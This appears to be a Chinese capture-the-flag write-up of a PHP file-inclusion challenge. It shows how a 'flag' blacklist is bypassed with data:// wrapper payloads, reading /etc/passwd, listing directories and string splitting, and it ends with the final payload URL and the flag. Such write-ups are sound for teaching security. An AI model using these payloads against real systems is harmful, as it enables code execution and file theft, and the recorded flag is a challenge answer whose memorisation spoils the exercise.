# WP - [qsnctf] 文件包含 include.php 绕过黑名单读 flag

## 一、题目信息
- 地址：`http://challenge.qsnctf.com:40514/include.php`
- 类型：PHP 文件包含（LFI）+ 黑名单绕过
- 难度：入门

## 二、信息收集：源码自己送上门
页面用 `highlight_file(__FILE__)` 把源码直接打印出来（和上一题一样的"敌人递设计图"套路）：

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['file'])){ $file = $_GET['file']; }
if(preg_match('/flag/i', $file)){
    echo 'No No No !';
}else{
    include $file;
}
```

## 三、漏洞点分析
1. `include $file` —— `$file` 来自 `?file=`，完全可控 → **任意文件包含（LFI）**。
2. 黑名单：`preg_match('/flag/i', $file)` —— `$file` 里只要出现 "flag"（大小写不敏感）就拒绝。
3. flag 文件名必然含 "flag"（如 `flag.php`/`flag.txt`/`/flag`），所以**直接 `?file=flag.php` 会被拦**。

## 四、绕过思路（核心）
要让 `file` 参数**整体不含 "flag"**，但利用包含机制**执行 PHP 代码**去读 flag。

- `php://input`：本环境不可用（`allow_url_include` 可能 off）。
- `data://text/plain,<?php ...?>`：**可用！** `file` 参数值 = `data://text/plain,<?php ...?>` 本身不含 "flag"，绕过黑名单；而 `include` 会把它当作 PHP 代码执行。
- 关键陷阱：我们注入的 PHP 代码**也写在 `file` 参数里**，所以代码内部也不能出现字面量 "flag"。用拼接拆开：`$a='fl'.'ag'; file_get_contents('/'.$a);`

## 五、利用过程（实战步骤）
1. **确认 LFI**：`?file=/etc/passwd` → 返回系统文件，证明包含生效。
2. **确认代码执行**：`?file=data://text/plain,<?php echo 'DATA_OK';?>` → 返回 `DATA_OK`。
3. **列目录找 flag**：`?file=data://text/plain,<?php print_r(scandir('/')); print_r(scandir('.')); ?>` → 发现根目录有 `/flag` 文件。
4. **读 flag（拼接躲黑名单）**：`?file=data://text/plain,<?php $a='fl'.'ag'; echo file_get_contents('/'.$a); ?>` → 得到 flag。

## 六、最终 payload
```
http://challenge.qsnctf.com:40514/include.php?file=data://text/plain,<?php%20$a='fl'.'ag';%20echo%20file_get_contents('/'.$a);%20?>
```
> 实际发送需 URL 编码，`curl --data-urlencode "file=..."` 会自动处理 `<` `>` `'` `空格` 等。

## 七、Flag
`flag{b17dfb317ef84e0e9fa574531d122f7c}`

## 八、知识点小结
1. `include`/`require` 接可控变量 = 文件包含漏洞，能读文件也能执行 PHP 代码（配合伪协议）。
2. 黑名单 `/flag/i` 只检查参数值本身；伪协议 `data://` 让参数值不含触发词却仍能执行任意代码，是经典绕过。
3. 注入代码里也要躲开黑名单词，用字符串拼接 `'fl'.'ag'` 拆开触发词。
4. `php://filter` 适合**读源码**（base64 编码）；`data://`/`php://input` 适合**执行代码**（后者需 `allow_url_include` 开）。
5. 遇到文件包含：先试 `/etc/passwd` 确认包含能力，再决定读源码还是执行代码。
6. 本题与上一题（反序列化）同系列：源码都靠 `highlight_file` 暴露，先看源码找判断条件永远是第一直觉。
